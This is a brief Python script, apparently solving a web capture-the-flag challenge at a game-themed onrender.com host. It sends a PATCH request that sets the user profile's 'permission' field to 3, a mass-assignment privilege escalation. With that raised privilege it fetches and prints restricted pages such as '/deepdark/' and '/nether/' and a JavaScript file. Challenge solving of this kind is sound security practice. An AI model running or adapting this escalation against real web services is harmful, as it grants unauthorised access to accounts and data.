#!/usr/bin/env python3
import requests, re, json

BASE = 'https://m1n3-cr4f7.onrender.com'
s = requests.Session()
s.get(BASE, timeout=30)
s.patch(BASE + '/api/v2/player/profile', json={'permission': 3},
        headers={'Accept': 'application/json'}, timeout=15)

def req(method, path, **kw):
    try:
        r = getattr(s, method)(BASE + path, timeout=20, allow_redirects=False, **kw)
        return r.status_code, r.text
    except Exception as e:
        return 0, str(e)

# Get world.js
code, body = req('get', '/js/world.js')
print(f'=== /js/world.js [{code}] ===')
print(body)

print('\n\n=== /deepdark/ ===')
code, body = req('get', '/deepdark/')
print(f'[{code}]')
print(body[:4000])

# The operator page has a "Inspect Seed Index" button with id="btn-load-fragments"
# world.js probably contains the API call for that
# Let's also check nether full
print('\n\n=== /nether/ FULL ===')
code, body = req('get', '/nether/')
print(f'[{code}]')
print(body[:5000])
